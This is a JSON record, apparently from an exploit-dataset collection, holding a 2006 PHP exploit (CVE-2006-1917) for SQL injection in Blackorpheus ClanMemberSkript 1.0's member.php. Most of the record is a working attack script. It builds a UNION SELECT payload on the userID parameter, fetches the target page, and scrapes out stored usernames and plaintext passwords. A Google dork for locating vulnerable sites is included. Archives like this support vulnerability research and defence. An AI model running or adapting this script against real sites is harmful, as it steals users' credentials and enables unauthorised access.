{
  "id": "1683",
  "title": "Blackorpheus ClanMemberSkript 1.0 - SQL Injection",
  "cve": "CVE-2006-1917",
  "vuln_type": "sqli",
  "code": "<?php /*\r\n\r\n |---==============================================================---|\r\n |                          /\\\u00af\\__       /\\\u00af\\                         |   \r\n |     ____    ___      __  \\ \\  _\\   ___\\ \\ \\___      __    ___      |    \r\n |    /  __\\ /  _  \\  / __ \\ \\ \\ \\/  / ___\\ \\  _  \\  / __ \\/\\  __\\    |    \r\n |   /\\__,  \\/\\ \\/\\ \\/\\ \\_\\ \\_\\ \\ \\_/\\ \\__/\\ \\ \\ \\ \\/\\  __/\\ \\ \\/     |     \r\n |   \\/\\____/\\ \\_\\ \\_\\ \\__/ \\_\\\\ \\__\\ \\____\\\\ \\_\\ \\_\\ \\____\\\\ \\_\\     |      \r\n |    \\/___/  \\/_/\\/_/\\/__/\\/_/ \\/__/\\/____/ \\/_/\\/_/\\/____/ \\/_/     |     \r\n |                                     >> Internet Security           |                         \r\n |---==============================================================---|\r\n \r\n        title: Blackorpheus ClanMemberSkript 1.0 remote sql injection\r\n      release: 2006-04-16\r\n       author: snatcher [snatcher at gmx.ch]\r\n      country: switzerland  |+|\r\n\t  \r\n  application: Blackorpheus ClanMemberSkript 1.0\r\n  description: a php / mysql based member management system\r\n     download: http://www.clanscripte.net/main.php?content=download&do=file&dlid=21\r\n  description: you can get each password with a simple sql injection. the password \r\n               is plaintext :)\r\n  fingerprint: google -> \"powered by ClanMemberSkript\" -> 18\r\n       greets: honkey, str0ke <- good exploit publisher :),\r\n\t\t\t   all security guys and coders over the world,\r\n terms of use: this exploit is just for educational purposes, do not use it for illegal acts.\r\n\r\n\r\n---------------------------- member.php - line 7 -------------------------------------\r\n$result = MYSQL_QUERY(\" SELECT * FROM $member_tab WHERE userID=$userID \");\r\n-----------------------------------------------------------------------------------------\r\n\r\nbecause this $userID isn't escaped correctly you can insert malicious sql code,\r\ni.e. with a union operator.\r\n\r\n\r\n*/\r\n\r\n/*********************** CONFIGURATION ****************************/\r\n\r\n$PATH_TO_FILE  = 'http://yourhost.com/member.php';                 // in example: http://yourhost.com/member.php\r\n$USER_ID       = 1;                                                // which user? default: 1\r\n$TABLE_PREFIX  = '';                                               // default: empty\r\n$GET_VARS      = '?userID=';                                       // do not change\r\n$SQL_INJECTION = '-666 union select 0,0,0,0,0,0,0,0,0,nick,pass,'. // do not change\r\n                 '0,0,0,0,0,0,0,0,0,0,0,0 from '.$TABLE_PREFIX.\r\n\t\t\t\t 'membersettings where userID = '.$USER_ID.' limit 1/*';\r\n\r\n\r\n/**************************** MAIN ********************************/\r\n\r\n$file_array = file($PATH_TO_FILE.$GET_VARS.urlencode($SQL_INJECTION))or die('couldn\\'t open host!'); \r\nforeach ($file_array as $now)                               \r\n\t$html_content .= $now;\r\n\r\n$html_content = str_castrate($html_content);\r\n\r\npreg_match_all(\"!Geburtsdatum:</font></td><tdwidth=\\\"50%\\\"><fontface=\\\"Verdana,Arial,Helvetica,sans\".\r\n               \"-serif\\\"size=\\\"2\\\">(.*?)</font>!\",\r\n\t\t\t   $html_content,$username); /* gets username */\r\npreg_match_all(\"!Wohnort:</font></td><tdwidth=\\\"50%\\\"><fontface=\\\"Verdana,Arial,Helvetica,sans-serif\".\r\n               \"\\\"size=\\\"2\\\">(.*?)</font>!\", \r\n                $html_content,$password); /* gets password */\r\n\r\nif ($username[1][0] && $password[1][0]) {\r\n\techo 'username: <b>'.$username[1][0].'</b><br>';\r\n\techo 'password: <b>'.$password[1][0].'</b>';\r\n}else {\r\n\techo 'exploit failed! <br>';\r\n}\r\necho '<br><br><br><br><br>\r\n======================================================================<br>\r\nexploit: Blackorpheus ClanMemberSkript 1.0 remote sql injection<br>\r\nrelease: 2006-04-16<br>\r\nauthor: snatcher [snatcher at gmx.ch]<br>\r\n======================================================================';\r\n\r\nfunction str_castrate($string) {\r\n\t$string = str_replace(\"\\n\", '', $string);\r\n\t$string = str_replace(\"\\r\", '', $string);\r\n\t$string = str_replace(\" \", '', $string);\r\n\treturn $string;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-04-16]",
  "url": "https://www.exploit-db.com/exploits/1683"
}